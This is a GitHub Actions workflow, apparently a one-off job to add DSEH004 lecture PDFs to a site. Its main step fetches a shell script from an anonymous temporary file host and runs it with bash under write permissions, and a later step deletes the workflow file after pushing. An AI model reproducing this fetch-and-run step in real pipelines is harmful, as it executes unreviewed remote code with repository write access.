name: One-off upload of DSEH004 Weeks 1 to 12 lecture PDFs

on:
  push:
    paths:
      - '.github/workflows/upload-dseh004-all.yml'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Download and verify files
        run: |
          set -euo pipefail
          curl -sSL --retry 3 -X POST "https://temp.sh/iHBAz/upload.sh" -o /tmp/upload.sh
          echo "990ce9ed349ffd378f301926cf0de9b942b1f76832043c3436b96d29bb9191d5  /tmp/upload.sh" | sha256sum -c -
          bash /tmp/upload.sh
      - name: Commit and remove this workflow
        run: |
          set -euo pipefail
          git config user.name "RKSinghDU"
          git config user.email "208256921+RKSinghDU@users.noreply.github.com"
          git add public/materials/dseh004/*.pdf public/materials/index.html
          git rm -q .github/workflows/upload-dseh004-all.yml
          git commit -m "Add DSEH004 lecture PDFs for Weeks 1 to 7 and 10 to 12; update materials page"
          git push
